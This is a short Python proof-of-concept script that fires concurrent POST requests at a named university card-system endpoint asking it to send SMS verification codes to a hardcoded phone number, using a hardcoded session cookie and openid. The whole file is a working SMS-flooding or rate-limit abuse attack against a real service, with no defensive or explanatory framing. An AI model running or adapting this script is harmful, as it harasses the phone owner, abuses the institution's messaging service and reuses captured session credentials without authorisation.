import requests

def poc(id):
    cookies = {
        'JSESSIONID': 'A01576D1F47767C56F7F2FACBF441392',
    }

    headers = {
        'Host': 'card.njau.edu.cn',
        # 'Content-Length': '21',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'X-Requested-With': 'XMLHttpRequest',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x63090b13)XWEB/9193',
        'Content-Type': 'application/json',
        'Origin': 'https://card.njau.edu.cn',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://card.njau.edu.cn/home/openHomePage?openid=79184DBE0BB9EBC4F7DF21B6B764182E2993A99C7BB8E06A5C6C1DA97881826F&usertype=',
        # 'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Connection': 'close',
        # 'Cookie': 'JSESSIONID=A01576D1F47767C56F7F2FACBF441392',
    }

    params = {
        'openid': '79184DBE0BB9EBC4F7DF21B6B764182E2993A99C7BB8E06A5C6C1DA97881826F',
    }

    json_data = {
        'tel': '13624346511',
    }

    response = requests.post(
        'https://card.njau.edu.cn/bind/getTelAuthCode',
        params=params,
        cookies=cookies,
        headers=headers,
        json=json_data,
        verify=False,
    )
    print( response.json())

from concurrent.futures import ThreadPoolExecutor
# # 批量检测
# with open('urls.txt', 'r') as file:
#     urls = [u.strip() for u in file.readlines()][200:]
ids = [i for i in range(0, 20)]
with ThreadPoolExecutor(max_workers=100) as executor:
    executor.map(poc, ids)
